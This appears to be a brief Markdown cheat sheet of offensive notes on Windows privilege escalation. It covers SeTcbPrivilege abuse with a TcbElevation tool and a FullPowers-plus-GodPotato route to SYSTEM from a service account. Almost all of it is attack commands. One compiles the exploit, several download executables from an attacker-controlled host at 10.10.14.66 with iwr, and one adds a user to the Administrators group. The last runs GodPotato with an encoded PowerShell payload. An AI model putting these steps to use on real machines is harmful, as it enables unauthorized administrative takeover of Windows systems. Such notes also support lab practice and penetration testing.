# Windows Privesc

## Windows SeTcbPrivilege - Privesc
```
# Windows SeTcbPrivilege - Privesc
Read about this privilege and its potential here : https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e
Additionally, we can find a proof-of-concept that is available and precompiled here : https://github.com/b4lisong/SeTcbPrivilege-Abuse

Compile with : x86_64-w64-mingw32-g++ TcbElevation.cpp -o TcbElevation.exe -lsecur32 -municode

Download with : iwr http://10.10.14.66:8000/TcbElevation-x64.exe -outfile

Use : .\TcbElevation-x64.exe elevate 'net localgroup Administrators enox /add'
```

## Windows - Privesc as a service account - SeAssignPrimaryToken and SeImpersonate + SeImpersonate
```
Path to SYSTEM would be to use FullPowers - a Proof-of-Concept tool made for automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and
SeImpersonate .
Once this is achieved we can use SweetPotato or GodPotato to abuse the SeImpersonate privilege.

whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= =================================== ========
SeTcbPrivilege Act as part of the operating system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeCreateGlobalPrivilege Create global objects Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled

# Activate fullPowers
iwr http://10.10.14.66:8000/FullPowers.exe -outfile FullPowers.exe
.\FullPowers.exe

# Once we've successfully recovered SeImperonsatePrivilege we can abuse it with one of the aforementioned potato exploits.
iwr http://10.10.14.66:8000/GodPotato-NET4.exe -outfile GodPotato-
NET4.exe
.\GodPotato-NET4.exe -cmd 'powershell -e <CMDS IN BASE64>'
```